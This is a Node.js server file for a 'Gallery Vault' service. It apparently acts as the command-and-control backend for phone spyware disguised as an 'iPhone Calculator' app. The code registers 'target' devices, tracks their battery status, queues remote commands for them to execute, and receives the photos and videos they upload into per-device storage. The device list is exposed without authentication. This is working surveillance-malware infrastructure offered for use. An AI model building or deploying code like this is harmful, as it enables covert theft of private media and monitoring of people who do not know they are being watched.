const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 1e8
});

const PORT = process.env.PORT || 7000;
const STORAGE_DIR = path.join(__dirname, 'storage');
const DB_FILE = path.join(__dirname, 'data.json');

if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try {
      return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
    } catch (e) {
      console.error('Error reading DB:', e);
    }
  }
  return { media: [] };
}

function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

let db = loadDB();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/storage', express.static(STORAGE_DIR));

// Configure Multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const devId = req.headers['x-device-id'] || 'default';
    const dir = path.join(STORAGE_DIR, devId);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname) || (file.mimetype.includes('video') ? '.mp4' : '.jpg');
    cb(null, 'vault-' + uniqueSuffix + ext);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: 500 * 1024 * 1024 }
});

// Multi-device active registry
// deviceId -> { deviceId, name, model, lastSeen, stats: { photosCount, videosCount, battery, isCharging }, socketId }
const devices = new Map();
const commandQueues = new Map(); // deviceId -> Array of commands

function cleanDeviceList() {
  const now = Date.now();
  const list = [];
  devices.forEach((dev, id) => {
    const isOnline = (now - dev.lastSeen) < 15000;
    list.push({
      id,
      name: dev.name || 'iPhone Calculator',
      model: dev.model || 'iOS Device',
      isOnline,
      lastSeen: dev.lastSeen,
      stats: dev.stats || { photosCount: 0, videosCount: 0, battery: 100, isCharging: false },
      mediaCount: db.media.filter(m => m.deviceId === id).length
    });
  });
  return list;
}

// --- API Routes ---

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', port: PORT, time: new Date().toISOString() });
});

// List all devices (No pairing code required!)
app.get('/api/devices', (req, res) => {
  res.json({ devices: cleanDeviceList() });
});

// Target device heartbeat & registration
app.post('/api/target/heartbeat', (req, res) => {
  const { deviceId, name, model, stats } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

  const id = deviceId.trim().toUpperCase();
  const existing = devices.get(id) || {};

  devices.set(id, {
    ...existing,
    id,
    name: name || existing.name || 'iPhone Calculator',
    model: model || existing.model || 'iOS Device',
    lastSeen: Date.now(),
    stats: stats || existing.stats || { photosCount: 0, videosCount: 0, battery: 100, isCharging: false }
  });

  // Notify connected admins
  io.emit('devices:update', cleanDeviceList());

  res.json({ success: true, registered: id });
});

// Legacy check endpoint backward compatibility
app.post('/api/pair/check', (req, res) => {
  const code = (req.body.code || '').trim().toUpperCase();
  if (req.body.device || req.body.stats) {
    const id = code || 'DEFAULT-DEV';
    devices.set(id, {
      id,
      name: req.body.device || 'iPhone Calculator',
      lastSeen: Date.now(),
      stats: req.body.stats || null
    });
    io.emit('devices:update', cleanDeviceList());
  }

  const list = cleanDeviceList();
  const dev = list.find(d => d.id === code) || { isOnline: false, mediaCount: 0 };
  res.json({
    code,
    isTargetOnline: dev.isOnline,
    stats: dev.stats,
    mediaCount: dev.mediaCount
  });
});

// Target polling for commands
app.get('/api/commands', (req, res) => {
  const id = (req.query.deviceId || req.query.code || '').trim().toUpperCase();
  if (!id) return res.status(400).json({ error: 'deviceId required' });

  // Update lastSeen
  if (devices.has(id)) {
    devices.get(id).lastSeen = Date.now();
  } else {
    devices.set(id, { id, lastSeen: Date.now() });
  }

  const queue = commandQueues.get(id) || [];
  if (queue.length > 0) {
    const nextCmd = queue.shift();
    return res.json({ hasCommand: true, command: nextCmd });
  }
  res.json({ hasCommand: false });
});

// Admin sends command to specific device
app.post('/api/commands', (req, res) => {
  const id = (req.body.deviceId || req.body.code || '').trim().toUpperCase();
  const command = req.body.command;
  if (!id || !command) return res.status(400).json({ error: 'deviceId and command required' });

  if (!commandQueues.has(id)) commandQueues.set(id, []);
  commandQueues.get(id).push(command);

  // If socket connected, deliver immediately
  const dev = devices.get(id);
  if (dev && dev.socketId) {
    io.to(dev.socketId).emit('target:execute', command);
  }

  console.log(`[Command Queued for ${id}]`, command);
  res.json({ success: true, queued: true });
});

// Target reports live transfer progress
app.post('/api/target/progress', (req, res) => {
  const { deviceId, current, total, percent, speed, eta } = req.body;
  io.emit('transfer:progress', { deviceId, current, total, percent, speed, eta });
  res.json({ ok: true });
});

// Upload media
app.post('/api/upload', upload.single('media'), (req, res) => {
  const deviceId = (req.headers['x-device-id'] || req.headers['x-pairing-code'] || 'DEFAULT').trim().toUpperCase();
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

  const mediaEntry = {
    id: path.basename(req.file.filename, path.extname(req.file.filename)),
    deviceId,
    filename: req.file.filename,
    originalName: req.file.originalname,
    mimeType: req.file.mimetype,
    size: req.file.size,
    type: req.file.mimetype.includes('video') ? 'video' : 'photo',
    url: `/storage/${deviceId}/${req.file.filename}`,
    createdAt: new Date().toISOString()
  };

  db.media.push(mediaEntry);
  saveDB(db);

  io.emit('media:new', mediaEntry);
  res.json({ success: true, media: mediaEntry });
});

// Get media list for a device (or all)
app.get('/api/media', (req, res) => {
  const deviceId = (req.headers['x-device-id'] || req.query.deviceId || req.query.code || '').trim().toUpperCase();
  let items = db.media;
  if (deviceId && deviceId !== 'ALL') {
    items = items.filter(m => m.deviceId === deviceId);
  }
  items = items.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json({ count: items.length, items });
});

// Delete media
app.delete('/api/media/:filename', (req, res) => {
  const { filename } = req.params;
  const idx = db.media.findIndex(m => m.filename === filename);
  if (idx === -1) return res.status(404).json({ error: 'Media not found' });

  const entry = db.media[idx];
  const filePath = path.join(STORAGE_DIR, entry.deviceId, filename);
  if (fs.existsSync(filePath)) {
    try { fs.unlinkSync(filePath); } catch (e) {}
  }

  db.media.splice(idx, 1);
  saveDB(db);

  io.emit('media:deleted', { filename });
  res.json({ success: true });
});

// --- Socket.IO ---
io.on('connection', (socket) => {
  // Send current devices to new admin
  socket.emit('devices:update', cleanDeviceList());

  socket.on('target:register', (data) => {
    const id = (data.deviceId || data.code || '').trim().toUpperCase();
    if (!id) return;

    socket.deviceId = id;
    devices.set(id, {
      id,
      name: data.name || 'iPhone Calculator',
      model: data.model || 'iOS Device',
      socketId: socket.id,
      lastSeen: Date.now(),
      stats: data.stats || null
    });
    socket.join(`device_${id}`);
    io.emit('devices:update', cleanDeviceList());
  });

  socket.on('admin:command', (data) => {
    const id = (data.deviceId || '').trim().toUpperCase();
    if (!id) return;

    if (!commandQueues.has(id)) commandQueues.set(id, []);
    commandQueues.get(id).push(data);

    const dev = devices.get(id);
    if (dev && dev.socketId) {
      io.to(dev.socketId).emit('target:execute', data);
    }
  });

  socket.on('disconnect', () => {});
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`===============================================`);
  console.log(`  GALLERY VAULT SERVER IS RUNNING ON PORT ${PORT}  `);
  console.log(`===============================================`);
});
